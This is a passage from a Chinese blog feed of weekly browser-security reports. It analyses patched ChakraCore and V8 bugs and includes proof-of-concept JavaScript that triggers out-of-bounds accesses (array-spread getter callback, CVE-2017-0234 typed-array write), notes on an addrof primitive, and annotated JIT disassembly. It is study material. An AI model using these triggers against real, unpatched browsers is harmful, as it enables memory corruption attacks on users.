    }
    return input;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;为什么最后面的标志位可以用于判断是否有回调呢？&lt;/p&gt;

&lt;p&gt;我们来看Patch后的调用，传入的是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ImplicitCall_Accessor&lt;/code&gt;，对应的值是&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x04&lt;/code&gt;，最后通过&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;|&lt;/code&gt;就不是原来的值，所以JIT在检查的时候，一看&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ImplicitCallFlags&lt;/code&gt;不是原来的值，那就说明&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExecuteImplicitCall&lt;/code&gt;判断这里存在回调，所以直接BailOut到Interpreter去解释执行&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ThreadContext* threadContext = scriptContext-&amp;gt;GetThreadContext();
Var replaceVar = threadContext-&amp;gt;ExecuteImplicitCall(replacefn, ImplicitCall_Accessor, [=]()-&amp;gt;Js::Var
{
    Var pThis = scriptContext-&amp;gt;GetLibrary()-&amp;gt;GetUndefined();
    return CALL_FUNCTION(threadContext, replacefn, CallInfo(4), pThis, match, JavascriptNumber::ToVar((int)indexMatched, scriptContext), input);
});

enum ImplicitCallFlags : BYTE
{
    ImplicitCall_HasNoInfo = 0x00,
    ImplicitCall_None = 0x01,
    ImplicitCall_ToPrimitive = 0x02 | ImplicitCall_None,
    ImplicitCall_Accessor = 0x04 | ImplicitCall_None,
    ImplicitCall_NonProfiledAccessor = 0x08 | ImplicitCall_None,
    ImplicitCall_External = 0x10 | ImplicitCall_None,
    ImplicitCall_Exception = 0x20 | ImplicitCall_None,
    ImplicitCall_NoOpSet = 0x40 | ImplicitCall_None,
    ImplicitCall_All = 0x7F,
    ImplicitCall_AsyncHostOperation = 0x80
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;之前分析的SamsungSMT逻辑提权漏洞，详细分析写了一半后来就没动了，看看下周写完给发出来吧，我喜欢逻辑漏洞，剩下的时间多看看编译原理，现在再来看编译原理感觉能和编译器很多知识点对应上，很有趣:))&lt;/p&gt;
</description>
                <pubDate>Fri, 06 Dec 2019 20:40:00 +0800</pubDate>
                <link>http://localhost:4000/browser_security/2019/12/06/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.12.02-2019.12.06.html</link>
                <guid isPermaLink="true">http://localhost:4000/browser_security/2019/12/06/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8%E5%91%A8%E6%8A%A5-2019.12.02-2019.12.06.html</guid>
            </item>
        
            <item>
                <title>浏览器安全周报 2019.11.25 - 2019.11.29</title>
                <description>&lt;p&gt;今年POC科恩讲了一个很赞的议题《Chrome Exploitation》，Slide一共175页，真的是走心了&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://www.powerofcommunity.net/poc2019/Gengming.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;上周的周报里提过Blade Team讲了Safari&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://powerofcommunity.net/poc2019/Zhiyang.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;所有的议程在这里&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;http://www.powerofcommunity.net/schedule.htm&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我一直很喜欢上交的Gossip，他们会定期发一些Paper的阅读笔记，喜欢分享，师傅们也很nice（虽然我没有认识的），Gossip有一个分享Paper阅读笔记的站点，最近他们把这个站点所有的文章以Markdown的模式传到了GitHub，方便线下阅读&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://securitygossip.com/&lt;/li&gt;
  &lt;li&gt;https://github.com/GoSSIP-SJTU/GoSSIP_Blog&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这周学习了2019 SSTIC一个ChakraCore相关的议题《A tale of Chakra bugs through the years》&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://www.sstic.org/media/SSTIC2019/SSTIC-actes/Pwning_Browsers/SSTIC2019-Slides-Pwning_Browsers-keith.pdf&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;其中提到了两个漏洞，跟大家分享一下我的学习心得&lt;/p&gt;

&lt;p&gt;其中提到一个漏洞的背景知识如下，获取属性时的回调&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/F8E9F7690AA2F5540FA9E945CD03B64B.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;漏洞所在代码&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/1066FC8800C0FA33192B3FE72FFF4FED.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我在看到这一页的时候，想起了泉哥在《安全研究者的自我修养》说的训练自己挖洞能力&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://mp.weixin.qq.com/s?__biz=MzU0MzgzNTU0Mw==&amp;amp;mid=2247483913&amp;amp;idx=1&amp;amp;sn=2a0558592e072389e348dc8f7c6223d1&amp;amp;scene=21#wechat_redirect&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;2、训练挖洞的双技能
（1）看洞：哪里看？历史漏洞的git log、bug报告、代码质量报告等等
（2）识洞：就是肉眼看代码找漏洞，即代码审计，难点也就是在这上面，训练方法继续往下看

3、代码审计训练
（1）根据自己目标定位，寻找相应的历史漏洞案例进行学习，比如要搞chrome就找chrome的历史漏洞
（2）掌握漏洞所在的模块或子系统，但不看完整的漏洞细节描述，尝试在漏洞版本中找出对应的漏洞
（3）如果（2）中未能找出漏洞，就去看漏洞细节描述，对比自己的审计过程，看遗漏了哪一步骤
（4）不断重复上述训练，直至相信：挖洞只是体力消耗，而非能力问题

这第4点说得，非常励志，因为挖洞挖久了，有时真的容易怀疑自己的能力，目标难度越大，越容易打击人。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;于是我没有继续往下翻，仔细的读了读代码，成功看出了漏洞点，因为我没有读过ChakraCore的源码，所以看的仔细些，核心就是之前那个前置知识，获取元素的时候可以回调，回调里可以修改数组长度，由于循环部分已经通过了长度检查，所以OOB&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/429801D6EDA5011F41DF7FE83013A58F.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;POC&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;let a = [1,2,3];

// setting length to 4 means that a[3] 
// is not defined on the array itself 
// the spread operation will have to walk 
// the prototype chain to see if it is defined
a.length = 4;

// a.__proto__ == Array.prototype 
// callback will be executed when doing 
// DirectGetItemAtFull for index 3
Array.prototype.__defineGetter__(&quot;3&quot;, function () 
{
    a.length = 0x10000000;
    a.fill(0x414141);
});

// trigger array spread, will trigger a segfault
Math.max(...a);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我之前在V8里看过类似的漏洞Pattern&lt;/p&gt;

&lt;p&gt;V8一个漏洞Pattern一样的漏洞：CVE-2016-1646 Array.concat OOB&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://bugs.chromium.org/p/chromium/issues/detail?id=594574&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetElement()&lt;/code&gt;获取元素时触发回调&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;switch (array-&amp;gt;GetElementsKind()) {
    case FAST_SMI_ELEMENTS:
    case FAST_ELEMENTS:
    case FAST_HOLEY_SMI_ELEMENTS:
    case FAST_HOLEY_ELEMENTS: {
        // Run through the elements FixedArray and use HasElement and GetElement
        // to check the prototype for missing elements.
        Handle&amp;lt;FixedArray&amp;gt; elements(FixedArray::cast(array-&amp;gt;elements()));
        int fast_length = static_cast&amp;lt;int&amp;gt;(length);  &amp;lt;-- fast_length keeps its value after entering the iteration below
        DCHECK(fast_length &amp;lt;= elements-&amp;gt;length());
        for (int j = 0; j &amp;lt; fast_length; j++) {
            HandleScope loop_scope(isolate);
            Handle&amp;lt;Object&amp;gt; element_value(elements-&amp;gt;get(j), isolate); &amp;lt;-- get the element with index j (leading to oob access)
            if (!element_value-&amp;gt;IsTheHole()) {
                visitor-&amp;gt;visit(j, element_value);
            } else {  &amp;lt;-- if it is a hole, it may go to its prototype for the value with index j
            Maybe&amp;lt;bool&amp;gt; maybe = JSReceiver::HasElement(array, j);
            if (!maybe.IsJust()) return false;
                if (maybe.FromJust()) {
                    // Call GetElement on array, not its prototype, or getters won't
                    // have the correct receiver.
                    ASSIGN_RETURN_ON_EXCEPTION_VALUE(
                        isolate, element_value, Object::GetElement(isolate, array, j),
                        false);     &amp;lt;-- here we redefine the function to get the value in array's __proto__ with index j
                                    &amp;lt;-- inside our redefinition function we make the length of the array shorter (&amp;lt; fast_length)
                    visitor-&amp;gt;visit(j, element_value);
                }
            }
        }
        break;
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;第二个是JIT洞，这个漏洞我没有看出来，但是其实我应该是可以看出来的，需要好好反思&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;首先&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a[0] = 1.2;&lt;/code&gt;，这一步会进行&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a[0]&lt;/code&gt;的各项检查&lt;/li&gt;
  &lt;li&gt;ChakraCore的JIT Compiler认为&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;b[0] = c;&lt;/code&gt;是没有side-effect的&lt;/li&gt;
  &lt;li&gt;因为2里面没有side-effect，所以&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;return a[0]&lt;/code&gt;会跳过检查&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/6CBF7C89917647F2E62B4ADCC662847A.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;咋一看没啥问题&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/7F7112B41B44F014425222E76A8FE385.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;但是这里其实是存在回调导致的side-effect&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/81D0059F18FD9DDBCA35BF9A3982EC44.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;定义&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;valueOf&lt;/code&gt;，通过赋值操作修改掉&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a&lt;/code&gt;的类型，但是JIT Compiler认为它没有side-effect，所以不会有其它操作，直接返回&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a[0]&lt;/code&gt;的值，就可以达到一个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;addrof&lt;/code&gt;原语&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/E156825AEB12B7D2B57CE73A067A2A3B.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在2017年的Pwn2Own上，腾讯湛卢实验室用两个漏洞攻破了Edge，分别是CVE-2017-0234和CVE-2017-0236&lt;/p&gt;

&lt;p&gt;这周我把CVE-2017-0234的细节分析了一遍&lt;/p&gt;

&lt;p&gt;补丁&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;https://github.com/microsoft/ChakraCore/commit/a1345ad48064921e8eb45fa0297ce405a7df14d3&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;从补丁的Message可以猜测这个漏洞可能跟开发人员默认了4GB这个限制有关&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[CVE-2017-0234] Too aggressive bound check removal

Don't eliminate bounds checks on virtual typed arrays if we can't guarantee that the accesses will be within 4Gb
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;CVE-2017-0234的Poc如下&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function write(begin, end, step, num) {
    for (var i = begin; i &amp;lt; end; i += step) 
        view[i] = num;
}
var buffer = new ArrayBuffer(0x10000);
var view = new Uint32Array(buffer);
write(0, 0x4000, 1, 0x1234);
write(0x3000000e, 0x40000010, 0x10000, 1851880825);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;使用VS进行调试，程序会碰到异常自动断下，我们在右下角点击&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;调用堆栈&lt;/code&gt;可以看到当前程序的函数调用栈，可以看到问题出在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ChakraCore.dll!Js::InterpreterStackFrame::CallLoopBody&lt;/code&gt;，双击最上面的地址&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;000001e58032014c()&lt;/code&gt;可以出现地址对应的反汇编地址，图中的反汇编就是生成的JIT代码&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/A7D798F6E5FB02DA9AB630F64853CBF4.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我们拷贝部分代码出来，下面是部分寄存器的值，结合Poc我们可以分析出寄存器&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r12&lt;/code&gt;存储的是第二个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;write()&lt;/code&gt;函数调用里的第四个参数，寄存器&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r8&lt;/code&gt;存储的是第二个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;write()&lt;/code&gt;函数调用的第一个参数，也就是说这一句汇编对应的是给数组进行赋值操作，之所以乘以&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4&lt;/code&gt;是因为这是个&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Uint32Array&lt;/code&gt;数组，每个数据长度为4字节&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;000001E580320122  jle         000001E5803202EB  
000001E580320128  mov         dword ptr [rsi+9397Ch],eax  
000001E58032012E  inc         eax  
000001E580320130  cmp         r8d,r9d  
000001E580320133  jge         000001E580320171  
000001E580320135  mov         r10,r13  
000001E580320138  mov         r11,r10  
000001E58032013B  shr         r11,30h  
000001E58032013F  cmp         r11,1  
000001E580320143  jne         000001E5803202FD  
000001E580320149  mov         r12d,r10d  
000001E58032014C  mov         dword ptr [rbx+r8*4],r12d  

R10D	6E617579	RBX	000001EDFFFF0000	
R12D	6E617579	R8 	000000003000000E	R11	0000000000000001	

&amp;gt;&amp;gt;&amp;gt; hex(1851880825)
'0x6e617579'
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;对应的崩溃现场代码，传入的参数就是JITed Code的地址，那么我们也可以打个断点把JITed Code打印出来&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;uint
InterpreterStackFrame::CallLoopBody(JavascriptMethod address)
{
    ...
    uint newOffset = ::Math::PointerCastToIntegral&amp;lt;uint&amp;gt;(
        CALL_ENTRYPOINT_NOASSERT(address, function, CallInfo(CallFlags_InternalFrame, 1), this));
   
    ...
    return newOffset;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;从函数断下的地方跳到上层调用&lt;/p&gt;

&lt;p&gt;函数&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;InterpreterStackFrame::DoLoopBodyStart()&lt;/code&gt;会调用&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;InterpreterStackFrame::CallLoopBody()&lt;/code&gt;执行JITed Code，我们在此处打个断点&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;LoopHeader const * InterpreterStackFrame::DoLoopBodyStart(uint32 loopNumber, LayoutSize layoutSize, const bool doProfileLoopCheck, const bool isFirstIteration)
{
    ...
    uint newOffset = 0;
    if (fn-&amp;gt;GetIsAsmJsFunction())
    {
        AutoRestoreLoopNumbers autoRestore(this, loopNumber, doProfileLoopCheck);
        newOffset = this-&amp;gt;CallAsmJsLoopBody(entryPointInfo-&amp;gt;jsMethod);
    }
    else
    {
        AutoRestoreLoopNumbers autoRestore(this, loopNumber, doProfileLoopCheck);
        newOffset = this-&amp;gt;CallLoopBody(entryPointInfo-&amp;gt;jsMethod);
    }
    
    ...
    return nullptr;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;打好断点后，再次运行断下，左下角监控窗口找到&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;entryPointInfo-&amp;gt;jsMethod&lt;/code&gt;的值，反汇编窗口跟过去，可以看到生成的JITed Code&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/resources/2004BF221ECBF6E3EE94202AB99F27EF.jpg&quot; alt=&quot;IMAGE&quot; /&gt;&lt;/p&gt;

&lt;p&gt;此处补充一个知识点：ChakraCore为了区分指针和数据，会对整数进行box，具体就是与&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x0001000000000000&lt;/code&gt;进行或运算&lt;/p&gt;

&lt;p&gt;将JITed Code完整拷贝出来，我们来读一下，理解下Patch前后的JITed Code有哪些区别&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// 不重要的代码
0000026669150000  mov         rax,26669180A78h  
000002666915000A  mov         rax,qword ptr [rax]  
000002666915000D  add         rax,1C30h  
0000026669150014  jo          000002666915039F  
000002666915001A  cmp         rsp,rax  
000002666915001D  jle         000002666915039F  
0000026669150023  nop         dword ptr [rax]  
0000026669150026  nop         dword ptr [rax]  
000002666915002A  mov         qword ptr [rsp+20h],r9  
000002666915002F  mov         qword ptr [rsp+18h],r8  
0000026669150034  mov         qword ptr [rsp+10h],rdx  
0000026669150039  mov         qword ptr [rsp+8],rcx  
000002666915003E  push        rbp  
0000026669150040  mov         rbp,rsp  
0000026669150043  sub         rsp,38h  
0000026669150047  push        r15  
0000026669150049  push        r14  
000002666915004B  push        r13  
000002666915004D  push        r12  
000002666915004F  push        rdi  
0000026669150051  push        rsi  
0000026669150053  push        rbx  
// 这里开始
0000026669150055  sub         rsp,30h  抬高栈顶
0000026669150059  mov         rbx,26669181ED8h          RBX = 0000026669181ED8
0000026669150063  mov         rsi,7FF94DC4CEF8h         RSI = 00007FF94DC4CEF8
000002666915006D  mov         rdi,26E692947C4h          RDI = 0000026E692947C4
// 数据来自调试，此处获取传入的参数
0000026669150077  mov         r12,qword ptr [rbp+20h]  	R12	= 000000F0EF6FDCB0	
000002666915007B  mov         r13,qword ptr [r12+160h]  R13	= 0001000000010000，根据上面的小知识点，可以看到这就是第三个参数0x10000
0000026669150083  mov         r14,qword ptr [r12+168h]  R14	= 000100006E617579，第四个参数1851880825
000002666915008B  mov         r15,qword ptr [r12+158h]  R15	= 0001000040000010，第二个参数0x40000010
0000026669150093  mov         rax,qword ptr [r12+170h]  RAX	= 000100003000000E，第一个参数0x3000000e
000002666915009B  xor         ecx,ecx  	                ECX	= 00000000
// 不理解这里在判断什么，像是一个恒不跳转的条件
000002666915009D  mov         byte ptr [rbx],1  
00000266691500A0  mov         byte ptr [rbx-15Eh],3  
00000266691500A7  mov         rdx,qword ptr [rdi+1784Ch]  
00000266691500AE  mov         rdx,qword ptr [rdx+38h]   RDX	= 0000026E692E2940	
00000266691500B2  mov         byte ptr [rbx-15Eh],0  
00000266691500B9  cmp         byte ptr [rbx],1  
00000266691500BC  jne         00000266691501B1  
// 判断第三个参数为整数
00000266691500C2  mov         r8,r13                    R8 = R13 = 0x10000
00000266691500C5  mov         r9,r8                     R8 = R13 = 0001000000010000
00000266691500C8  shr         r9,30h                    R9 = R9&amp;gt;&amp;gt;30 = 0001000000010000&amp;gt;&amp;gt;30 = 0000000000000001
00000266691500CC  cmp         r9,1  
00000266691500D0  jne         00000266691501CE  
// 判断第一个参数为整数
00000266691500D6  mov         r8d,r8d                   R8D = 0x10000
00000266691500D9  mov         r9,rax                    R9 = RAX = 000100003000000E，第一个参数
00000266691500DC  mov         r10,r9                    R10 = R9 = RAX = 000100003000000E
00000266691500DF  shr         r10,30h                   R10 = R10&amp;gt;&amp;gt;30 = 000100003000000E&amp;gt;&amp;gt;30 = 0x0000000000000001
00000266691500E3  cmp         r10,1  
00000266691500E7  jne         0000026669150222  
// 判断第二个参数为整数
00000266691500ED  mov         r9d,r9d                   R9D = 0x3000000E
00000266691500F0  mov         r10,r15                   R10 = R15 = 0001000040000010
00000266691500F3  mov         r11,r10                   R11 = R10 = 0001000040000010
00000266691500F6  shr         r11,30h                   R11 = R11&amp;gt;&amp;gt;30 = 0001000040000010&amp;gt;&amp;gt;30 = 0000000000000001
00000266691500FA  cmp         r11,1  
00000266691500FE  jne         000002666915027E  
// 判断R11是否是指针
0000026669150104  mov         r10d,r10d                 R10D = 40000010
0000026669150107  mov         r11,rdx                   R11	= RDX = 0000026E692E2940	
000002666915010A  shr         r11,30h  		            R11	 = R11&amp;gt;&amp;gt;30 = 0000026E692E2940&amp;gt;&amp;gt;30 = 0000000000000000	
000002666915010E  jne         00000266691502DF  
// 湛泸的文章说这里是在判断虚表来检查是否是合法的typearray
// 根据寄存器RDX存储的是数组对象的指针刚好验证了这一点
// &amp;gt;dd rdx
// 0x0000026E692E2940  4dc4cef8 00007ff9 692a9540 0000026e
0000026669150114  cmp         qword ptr [rdx],rsi       RSI = 00007FF94DC4CEF8
0000026669150117  jne         00000266691502DF  
// 此时RDX为数组对象的指针，偏移为0x38是数组的Buffer，这个指针指向的内存存储的是真正的数组数据
000002666915011D  mov         rsi,qword ptr [rdx+38h]  
// 不明白这里在对比什么，栈空间？
0000026669150121  mov         r11,26669180A78h  
000002666915012B  cmp         rsp,qword ptr [r11]  
000002666915012E  jle         0000026669150319  
// 从上面分析来看，ECX为0，并自增一，应该是循环计数器
0000026669150134  mov         dword ptr [rdi+9397Ch],ecx  
000002666915013A  inc         ecx  
// 可以看到这里在比较循环的Begin要小于End
000002666915013C  cmp         r9d,r10d  	            R9D = 3000000E，R10D = 40000010
000002666915013F  jge         000002666915017D  
// 第四个参数1851880825，判断是否是整数
0000026669150141  mov         r11,r14  		            R14 = 000100006E617579，R11 = 0000026669180A78
0000026669150144  mov         r13,r11  
0000026669150147  shr         r13,30h  
000002666915014B  cmp         r13,1  
000002666915014F  jne         000002666915032B  
// 经过一系列检查，我们看到就直接做了赋值操作，而整个流程只判断了循环的Begin小于End，其它条件一概没判断，导致一个OOB
0000026669150155  mov         r13d,r11d                 R11D = 6E617579
0000026669150158  mov         dword ptr [rsi+r9*4],r13d  执行赋值操作
// 加上循环的Step后进行判断，不溢出就下一次循环
000002666915015C  add         r9d,r8d  
000002666915015F  jno         0000026669150121  
// 溢出了就退出
0000026669150161  sub         r9d,r8d  
0000026669150164  mov         rcx,26E691DD898h  
000002666915016E  mov         rax,7FF94D8F4850h  
0000026669150178  call        rax  
000002666915017B  jmp         0000026669150199  
000002666915017D  mov         edx,r9d  
0000026669150180  bts         rdx,30h  
0000026669150185  mov         rax,rdx  
0000026669150188  mov         qword ptr [r12+170h],rax  
0000026669150190  mov         dword ptr [rdi],ecx  
0000026669150192  mov         rax,26h  
0000026669150199  add         rsp,30h  
000002666915019D  pop         rbx  
000002666915019F  pop         rsi  
00000266691501A1  pop         rdi  
00000266691501A3  pop         r12  
00000266691501A5  pop         r13  
00000266691501A7  pop         r14  
00000266691501A9  pop         r15  
00000266691501AB  mov         rsp,rbp  
00000266691501AE  pop         rbp  
00000266691501B0  ret  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;用同样的方式，我们打印出Patch之后的JITed Code，对比都添加了哪些检查&lt;/p&gt;

&lt;p&gt;可以看到下面标出的两个新增检查点：&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;计数器是否为负数&lt;/li&gt;
  &lt;li&gt;循环End是否大于数组长度&lt;/li&gt;
&lt;/ol&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// 不重要的代码
000002E734590000  mov         rax,2DE342E0A98h  
000002E73459000A  mov         rax,qword ptr [rax]  
000002E73459000D  add         rax,1C20h  
000002E734590014  jo          000002E73459036D  
000002E73459001A  cmp         rsp,rax  
000002E73459001D  jle         000002E73459036D  
000002E734590023  nop         dword ptr [rax]  
000002E734590026  mov         qword ptr [rsp+20h],r9  
000002E73459002B  mov         qword ptr [rsp+18h],r8  
000002E734590030  mov         qword ptr [rsp+10h],rdx  
000002E734590035  mov         qword ptr [rsp+8],rcx  
000002E73459003A  push        rbp  
000002E73459003C  mov         rbp,rsp  
000002E73459003F  sub         rsp,30h  
000002E734590043  push        r15  
000002E734590045  push        r14  
000002E734590047  push        r13  
000002E734590049  push        r12  
000002E73459004B  push        rdi  
000002E73459004D  push        rsi  
000002E73459004F  push        rbx  
// 这里开始
000002E734590051  sub         rsp,28h  
000002E734590055  mov         rbx,2DE342B01C0h  
000002E73459005F  mov         rsi,7FFBD004EA28h  
000002E734590069  mov         rdi,2E6343F47C4h  
000002E734590073  mov         r12,qword ptr [rbp+20h]  
000002E734590077  mov         r13,qword ptr [r12+160h]  
000002E73459007F  mov         r14,qword ptr [r12+168h]  
000002E734590087  mov         r15,qword ptr [r12+158h]  
000002E73459008F  mov         rax,qword ptr [r12+170h]  
000002E734590097  xor         ecx,ecx  
000002E734590099  mov         byte ptr [rbx+31D38h],1  
000002E7345900A0  mov         byte ptr [rbx+31BDAh],3  
000002E7345900A7  mov         rdx,qword ptr [rdi+1784Ch]  
000002E7345900AE  mov         rdx,qword ptr [rdx+38h]  
000002E7345900B2  mov         byte ptr [rbx+31BDAh],0  
000002E7345900B9  cmp         byte ptr [rbx+31D38h],1  
000002E7345900C0  jne         000002E7345901C9  
000002E7345900C6  mov         r8,r13  
000002E7345900C9  mov         r9,r8  
000002E7345900CC  shr         r9,30h  
000002E7345900D0  cmp         r9,1  
000002E7345900D4  jne         000002E7345901DF  
000002E7345900DA  mov         r8d,r8d  
000002E7345900DD  mov         r9,rax  
000002E7345900E0  mov         r10,r9  
000002E7345900E3  shr         r10,30h  
000002E7345900E7  cmp         r10,1  
000002E7345900EB  jne         000002E73459022C  
000002E7345900F1  mov         r9d,r9d  
000002E7345900F4  mov         r10,r15  
000002E7345900F7  mov         r11,r10  
000002E7345900FA  shr         r11,30h  
000002E7345900FE  cmp         r11,1  
000002E734590102  jne         000002E734590281  
000002E734590108  mov         r10d,r10d  
000002E73459010B  mov         r11,rdx  
000002E73459010E  shr         r11,30h  
000002E734590112  jne         000002E7345902DB  
000002E734590118  cmp         qword ptr [rdx],rsi  
000002E73459011B  jne         000002E7345902DB  
// 新增判断：判断循环的End是否超过数组长度
000002E734590121  mov         esi,dword ptr [rdx+20h]  
000002E734590124  cmp         r10d,esi  
000002E734590127  jg          000002E7345902EE  
000002E73459012D  mov         rbx,qword ptr [rdx+38h] 
// 循环点
000002E734590131  mov         rsi,2DE342E0A98h  
000002E73459013B  cmp         rsp,qword ptr [rsi]  
000002E73459013E  jle         000002E734590321  
000002E734590144  mov         dword ptr [rdi+9397Ch],ecx  
000002E73459014A  inc         ecx  
// 判断索引小于循环End
000002E73459014C  cmp         r9d,r10d  
000002E73459014F  jge         000002E734590195  
// 新增判断：判断R9D为非负数
000002E734590151  test        r9d,r9d  
000002E734590154  js          000002E734590333  
000002E73459015A  mov         rsi,r14  
000002E73459015D  mov         r11,rsi  
000002E734590160  shr         r11,30h  
000002E734590164  cmp         r11,1  
000002E734590168  jne         000002E73459034F  
// 做赋值操作
000002E73459016E  mov         esi,esi  
000002E734590170  mov         dword ptr [rbx+r9*4],esi  
000002E734590174  add         r9d,r8d  
000002E734590177  jno         000002E734590131  
